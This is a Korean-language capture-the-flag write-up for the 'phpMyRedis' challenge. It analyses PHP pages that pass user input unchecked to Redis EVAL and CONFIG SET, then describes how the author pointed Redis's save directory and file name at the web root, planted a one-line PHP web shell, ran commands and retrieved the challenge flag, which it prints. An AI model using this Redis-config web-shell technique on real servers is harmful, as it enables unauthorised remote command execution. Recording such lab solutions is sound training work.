https://teberr.notion.site/phpMyRedis-5da0b12ea314483d80a1ea8af18e45b6

# 문제파일 다운로드

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/83961091-99a4-47a1-b419-290de20c5cfe/%EB%AC%B8%EC%A0%9C.png)

phpMyRedis 문제파일을 다운로드 받으면 도커파일과 [run-lamp.sh](http://run-lamp.sh) 파일 및 src폴더가 존재하며 그 내부에는 config.php,index.php, core.php, reset.php 소스파일이 존재한다.

전부를 다 보기는 어렵기 때문에 핵심적인 내용인 소스코드 파일인 config.php, index.php 만 살펴보며 진행하고자 한다.

# 코드 분석 및 공격 설계

php 파일 전체를 살펴보기 보다는 핵심적인 부분만 분석해보자.

## index.php

![index.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/39cf87f5-1e5d-4b97-b3cc-3ac5d8478fda/index.png)

```php
<?php 
	if(isset($_POST['cmd'])){
		$redis = new Redis();
		$redis->connect($REDIS_HOST);
		$ret = json_encode($redis->eval($_POST['cmd']));
		echo '<h1 class="subtitle">Result</h1>';
		echo "<pre>$ret</pre>";
		if (!array_key_exists('history_cnt', $_SESSION)) {
			$_SESSION['history_cnt'] = 0;
		}
		$_SESSION['history_'.$_SESSION['history_cnt']] = $_POST['cmd'];
		$_SESSION['history_cnt'] += 1;
		if(isset($_POST['save'])){
			$path = './data/'. md5(session_id());
			$data = '> ' . $_POST['cmd'] . PHP_EOL . str_repeat('-',50) . PHP_EOL . $ret;
			file_put_contents($path, $data);
			echo "saved at : <a target='_blank' href='$path'>$path</a>";
		}
	}
?>
```

redis 데이터베이스에 연결후 eval 명령어를 통해 cmd 입력창에 들어있는 값들을 redis에서 실행한다. 이는 redis 2.6.0 버전부터 내장되어 있는 Lua interpreter에 넣어서 실행을 시키는 것으로 사용자의 입력값을 검증하고 있지 않으므로 원하는 데이터를 저장하고 불러올 수 있다.

DOCS를 살펴보면 아래와 같은 내용을 볼 수 있다.

> EVAL 사용법
- Lua script를 실행합니다.
> 
> 
> > EVAL "return redis.call('set', 'key', 'value')"
> 
> OK
> 
> > EVAL "return redis.call('get', 'key')"
> 
> value
> 

이를 바탕으로 실제 작동하는지 set, get을 통해 테스트를 해보자.

![테스트 성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bc973529-1661-4ee1-9650-e6b0e041558b/%ED%85%8C%EC%8A%A4%ED%8A%B8_%EC%84%B1%EA%B3%B5.png)

SET을 통해서 sample이라는 key에 success라는 value 값을 넣어줬다.

![테스트 성공2.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f5b6d328-66cb-455d-945d-8ccbd80b4415/%ED%85%8C%EC%8A%A4%ED%8A%B8_%EC%84%B1%EA%B3%B52.png)

GET을 통해 sample이라는 key에 담긴 value 값을 가져오면 success 문자열이 성공적으로 반환되는 것을 확인할 수 있다.

## config.php

![config.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/46ec538c-8048-44bc-9e6c-8b0fa932c4fc/config.png)

```php
<?php 
	if(isset($_POST['option'])){
		$redis = new Redis();
		$redis->connect($REDIS_HOST);
		if($_POST['option'] == 'GET'){
			$ret = json_encode($redis->config($_POST['option'], $_POST['key']));
		}elseif($_POST['option'] == 'SET'){
			$ret = $redis->config($_POST['option'], $_POST['key'], $_POST['value']);
		}else{
			die('error !');
		}                        
		echo '<h1 class="subtitle">Result</h1>';
		echo "<pre>$ret</pre>";
	}
?>
```

CONFIG 값을 설정할 수 있는 페이지이다. 이 위치에서 set dir /tmp 를 수행한다고 하면

CONFIG SET dir /tmp로 진행된다. 

CONFIG 값을 사용자가 제한 없이 수정할 수 있기 때문에 원하는 설정값을 변경할 수 있다.

이 두 페이지를 이용해서 CONFIG 설정을 조작하여 **`원하는 위치(PATH)`**에 `**원하는 데이터**`를 원할 때 SAVE시키고자 한다.

따라서 원하는 위치를 조작하기 위해서는 `CONFIG SET DIR “경로”`

데이터가 저장될 파일명을 조작하기 위해서는 CONFIG SET dbfilename “파일명”

데이터를 저장할 시기를 조작하기 위해서는 CONFIG SET SAVE “주기” 

를 사용하여 웹쉘 데이터를 넣어준 후 저장을 시켜 웹쉘을 서버에 올리는 방식으로 공격할 것이다.

# 공격

데이터 파일이 저장될 경로는 index.php에서 save를 체크하면 결과값이 저장이 되는 폴더인 /var/www/html/data(상대경로로는 ./data/)로 지정해주자. 왜냐하면 이 폴더로 접근할 것이기에 접근성이 편하기 때문이다.

이는 CONFIG 값 중 dir 값에 지정해주면 된다.

![dir.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8db2fe37-6aad-4e56-91ff-03392f8b39e9/dir.png)

dir 값을 ./data/로 지정해주면 /var/www/html/data로 지정이 된다.

![dbfilename.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c2dc3ff9-23bc-47ee-9659-5985c60256c8/dbfilename.png)

dbfilename은 데이터가 저장될 파일명을 지정하는 config 값이다. 이는 원하는 걸로 하면 되는데 웹쉘을 올리는 것이 목적이므로 php파일로 해주어야 한다. 따라서 redis.php로 설정해주었다.

CONFIG 페이지에서 config는 GET  key는 SAVE를 통하여 현재 저장 주기를 살펴보자

![save 기준.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ca1c3b1f-b3d7-419f-ac25-2cd7951a1f83/save_%EA%B8%B0%EC%A4%80.png)

이 설정값은 내가 원하는 때에(데이터 몇개가 저장되었을 때) 파일로 저장을 시키기엔 쉽지 않은 값이므로 변경해주어야 한다.

![save 변경.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5d83e108-be65-4e96-a9fd-2421c3942dfc/save_%EB%B3%80%EA%B2%BD.png)

{”save” : “10 1”}로 바꾸면 10초이내에 한번의 데이터 변경이 있을 시에 데이터를 `지정한 경로`에 `지정한 파일명`으로 저장한다.

그러면 이제 내가 원하는 데이터를 index.php에서 eval 명령어를 통해 cmd 입력창에 들어있는 값들을 redis에서 실행하면 Lua interpreter가 실행이 되면서 그 데이터를 /var/www/html/data/redis.php로 저장할 것이다.(10초내에 한번만 데이터가 설정되어도 저장되게 하였으므로)

웹쉘을 올리기 위해 php파일로 설정하였으므로 간단한 웹쉘인 <?php system($_GET[’cmd’]);?>로 데이터를 저장해주자.

![공격1.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d3331214-3fe9-40f3-8f36-cbb2d85e15cb/%EA%B3%B5%EA%B2%A91.png)

save를 체크하고 지정해주면 아래에 링크가 생긴다. 이를 눌러서 들어가면 data 폴더에 들어가게 된다.

![웹쉘.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8eca2d06-8d54-4749-b56f-264514efcfa5/%EC%9B%B9%EC%89%98.png)

이 경로를 redis.php로 변경하되 원하는 리눅스 명령어인 ls를 cmd의 인자로 넣어주자. 

![ls.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b7a70b53-0be4-4b18-8c44-a8c142589bcd/ls.png)

이 폴더에는 index.php, redis.php, 그리고 위의 save를 체크해서 생긴 파일이 존재하는 것을 확인할 수 있다.

현재 데이터가 저장된 /var/www/html/data의 위 폴더인 /var/www/html 폴더를 탐색해보았다.

![ls1.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5bc67751-9fd1-4249-9553-4e5a7b9f6320/ls1.png)

여전히 flag가 존재하지 않아 계속해서 위쪽 폴더를 탐색했다.

![ls 최상단.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b025ed65-f3ae-459e-a184-a1a638435da3/ls_%EC%B5%9C%EC%83%81%EB%8B%A8.png)

그 결과 최상단인 / 위치에 flag 파일이 존재하는 것을 확인할 수 있었다. 이 값을 cat으로 출력하려 했으나 출력이 되지 않아 ls -al로 상세 정보를 출력하고자 했다. 

![flag 실행권한만 있음.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/24f97e2d-022c-4748-9e8e-58eec93421f2/flag_%EC%8B%A4%ED%96%89%EA%B6%8C%ED%95%9C%EB%A7%8C_%EC%9E%88%EC%9D%8C.png)

ls -al을 통해서 flag 파일을 조사해본 결과 실행권한만 존재하는 것을 확인할 수 있었다. 

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c4aea69e-a621-4dac-a11f-de0934ebc31d/%EC%84%B1%EA%B3%B5.png)

그래서 flag 파일을 실행 해준 결과 flag 값인 `DH{97c08d732ca9ad65e35c8781ea3178f2d27bd726}`를 얻을 수 있었다.
